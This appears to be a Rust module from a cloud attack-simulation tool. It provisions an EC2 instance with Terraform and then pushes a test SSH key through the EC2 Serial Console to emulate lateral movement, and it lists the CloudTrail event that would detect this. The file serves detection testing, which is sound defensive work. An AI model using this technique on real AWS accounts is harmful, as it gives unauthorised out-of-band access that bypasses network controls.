use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

data "aws_ami" "amazon_linux_2" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

resource "aws_ec2_serial_console_access" "enabled" {
  enabled = true
}

resource "aws_instance" "target" {
  ami           = data.aws_ami.amazon_linux_2.id
  instance_type = "t3.micro"

  tags = {
    Name = "stratus-red-team-ec2-serial-console-${random_string.suffix.result}"
  }

  depends_on = [aws_ec2_serial_console_access.enabled]
}

output "instance_id" {
  value = aws_instance.target.id
}
"#;

/// A static RSA public key for testing purposes.
/// In a real attack scenario this would be a freshly generated ephemeral key pair.
const TEST_SSH_PUBLIC_KEY: &str = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3km4yjqLKJt7e/\
W9oWWb7TDVQ6eHaHiJL6mR8FvlFT8GWPZ7TiUTDJk8R1eFOgaqP3fO0j/\
9CRHSNv4TbOPq6ZIiJd1bNkOhw4E8vJiLoI9Qe3Ehn3OxVn5Gl1uY8D4B\
FgH5gT2dLjR7Wv4MkZvH9Oi8cLa2pXqT3NkEnM+stratus-test-key";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let instance_id = outputs
        .get("instance_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: instance_id"))?;

    aws.ec2instanceconnect
        .send_serial_console_ssh_public_key()
        .instance_id(instance_id)
        .serial_port(0)
        .ssh_public_key(TEST_SSH_PUBLIC_KEY)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Pushed SSH public key to serial console port 0 on instance {} via EC2 Serial Console. Key expires in 60 seconds.",
        instance_id
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.lateral-movement.ec2-serial-console-send-ssh-public-key",
        friendly_name: "Lateral Movement via EC2 Serial Console",
        description: "Pushes a temporary SSH public key to an EC2 instance's serial console using the SendSerialConsoleSSHPublicKey API. Provides out-of-band access to the instance that bypasses normal network controls, useful for lateral movement even when SSH/SSM is not accessible via the network.",
        detection: "CloudTrail: SendSerialConsoleSSHPublicKey.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::LateralMovement],
        is_idempotent: true,
        is_slow: true,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: None,
    }
}
